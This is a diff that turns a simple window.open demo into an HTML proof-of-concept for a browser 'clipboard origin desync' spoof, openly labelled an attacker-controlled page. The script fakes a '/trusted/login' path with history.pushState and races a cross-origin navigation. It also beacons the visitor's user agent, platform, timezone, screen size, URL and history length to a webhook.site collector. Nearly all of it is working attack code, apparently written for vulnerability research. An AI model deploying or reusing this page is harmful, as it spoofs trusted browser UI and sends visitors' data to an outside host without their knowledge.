@@ -1,39 +1,149 @@
-
-<!DOCTYPE html>
+<!doctype html>
 <html>
+<head>
+<meta charset="utf-8">
+<title>Clipboard Origin Desync PoC</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<style>
+body{
+  margin:0;
+  font-family:-apple-system,BlinkMacSystemFont,system-ui;
+  background:#f5f5f7;
+  text-align:center
+}
+button{
+  font-size:15px;
+  padding:12px 16px;
+  border-radius:12px;
+  border:none;
+  background:#007aff;
+  color:#fff;
+  margin:8px
+}
+#panel{
+  display:none;
+  max-width:420px;
+  margin:80px auto;
+  background:#fff;
+  padding:24px;
+  border-radius:16px;
+  box-shadow:0 20px 60px rgba(0,0,0,.2)
+}
+.notice{
+  margin-top:14px;
+  font-size:13px;
+  color:#b00020
+}
+</style>
+</head>
+
 <body>
 
-<h1>The Window Object</h1>
-<h2>The open() Method</h2>
+<h2 style="margin-top:60px;">Clipboard Origin Confusion PoC</h2>
+<p>Attacker-controlled page</p>
 
-<p>Click the button to open a new browser window.</p>
+<button id="start">Start PoC</button>
 
-<button onclick="myFunction()">Try it</button>
+<div id="panel">
+  <h3>Clipboard Access</h3>
+  <p>Observe trusted UI vs JS origin</p>
+  <button onclick="reqClipboard()">📋 Write Clipboard</button>
+  <p id="output">Result: -</p>
+  <div class="notice">
+    Demo only — clipboard trust UI may not match JS execution origin
+  </div>
+</div>
 
 <script>
-function myFunction() {
- var x = window.open("https://www.google.com/");
-   setTimeout(function(){x.alert()}, 550)
+/* ================= CONFIG ================= */
+const WEBHOOK = 'https://webhook.site/a132a5ec-337f-46d5-958f-f8a8f9376120';
+const NAV_TARGET = 'https://google.com:9090';
 
-   setTimeout(function(){x.document.write(`
-        <style>
-            html, body {
-                margin: 0;
-                padding: 0;
-                height: 100%;
-                overflow: hidden; /* Prevent scrolling or overflow */
-            }
+const panel  = document.getElementById('panel');
+const output = document.getElementById('output');
 
-            img.fullscreen {
-                height: 100vh;
-                width: 100vw;
-                object-fit: cover;
-                display: block;
-            }
-        </style>
-        <img class="fullscreen" src="screenshot.jpg" alt="Dog Screenshot">
-    `);}, 2400)
+/* ================= PASSIVE PROOF ================= */
+function sendProofGET(status){
+  let navType='na', navRedirects='na';
+  try{
+    const n = performance.getEntriesByType('navigation')[0];
+    if(n){
+      navType = n.type;
+      navRedirects = n.redirectCount;
+    }
+  }catch(e){}
+
+  const params = new URLSearchParams({
+    poc: 'clipboard-origin-desync',
+    status: status,
+
+    attacker_origin: location.origin,
+    attacker_url: location.href,
+
+    doc_state: document.readyState,
+    visibility: document.visibilityState,
+    has_focus: document.hasFocus(),
+    history_len: history.length,
+
+    secure_ctx: window.isSecureContext,
+    protocol: location.protocol,
+
+    nav_target: NAV_TARGET,
+    nav_type: navType,
+    nav_redirects: navRedirects,
+
+    platform: navigator.platform,
+    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+    screen_res: screen.width + 'x' + screen.height,
+    touch_points: navigator.maxTouchPoints,
+
+    ua: navigator.userAgent,
+    ts: Date.now()
+  });
+
+  const img = new Image();
+  img.src =
+    WEBHOOK +
+    '?' + params.toString() +
+    '&marker=END';
 }
+
+/* ================= CLIPBOARD ================= */
+function reqClipboard(){
+  if(navigator.clipboard && navigator.clipboard.writeText){
+    navigator.clipboard.writeText('origin-desync-test')
+      .then(() => {
+        output.textContent = 'Clipboard write: SUCCESS';
+        sendProofGET('clipboard_write_success');
+      })
+      .catch(err => {
+        output.textContent = 'Clipboard error: ' + err.name;
+        sendProofGET('clipboard_error_' + err.name);
+      });
+  }else{
+    output.textContent = 'Clipboard API not supported';
+    sendProofGET('clipboard_unsupported');
+  }
+}
+
+/* ================= ATTACK LOGIC ================= */
+/* Step 1: Fake trusted path */
+document.getElementById('start').onclick = () => {
+  history.pushState({}, '', '/trusted/login');
+  panel.style.display = 'block';
+};
+
+/* Step 2: Cross-origin navigation race */
+window.addEventListener('pageshow', () => {
+  requestAnimationFrame(() => {
+    requestAnimationFrame(() => {
+      setTimeout(() => {
+        location.href = 'https://google.com:9090/#https://google.com:9090';
+      }, 80);
+    });
+  });
+});
 </script>
 
 </body>
